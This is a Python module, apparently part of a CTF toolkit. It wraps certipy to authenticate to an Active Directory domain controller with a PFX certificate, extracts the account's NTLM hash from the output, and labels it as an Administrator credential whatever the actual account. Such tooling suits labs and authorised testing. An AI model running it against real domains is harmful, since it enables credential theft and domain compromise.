import subprocess
import re
from pathlib import Path


def run(data, cred, args):
    """
    Authenticate using a certificate (PFX)

    Usage:
        ctf ad.certauth file.pfx
    """

    extra = getattr(args, "extra", []) or []

    if not extra:
        print("[-] Missing PFX file")
        return data

    pfx_file = Path(extra[0]).expanduser()

    if not pfx_file.exists():
        print(f"[-] File not found: {pfx_file}")
        return data

    # -------------------------
    # Resolve target info
    # -------------------------
    ip = data.get("ip")

    if not ip:
        print("[-] Target missing IP")
        return data

    # -------------------------
    # Build command
    # -------------------------
    cmd = [
        "certipy",
        "auth",
        "-pfx", str(pfx_file),
        "-dc-ip", ip,
        "-no-save"
    ]

    print(f"[*] Running: {' '.join(cmd)}")

    # -------------------------
    # Execute + capture output
    # -------------------------
    try:
        result = subprocess.run(
            cmd,
            capture_output=True,
            text=True
        )
    except Exception as e:
        print(f"[-] Execution failed: {e}")
        return data

    output = result.stdout + result.stderr
    print(output)

    # -------------------------
    # Parse NTLM hash
    # -------------------------
    ntlm_match = re.search(r"Got hash for .*:.*:([0-9a-fA-F]{32})", output)

    if ntlm_match:
        ntlm_hash = ntlm_match.group(1)
        print(f"[+] Extracted NTLM: {ntlm_hash}")

        return [{
            "user": "Administrator",
            "type": "ntlm",
            "secret": ntlm_hash
        }]

    # -------------------------
    # Parse ntlm
    # -------------------------

    print("[-] No credential extracted")
    return data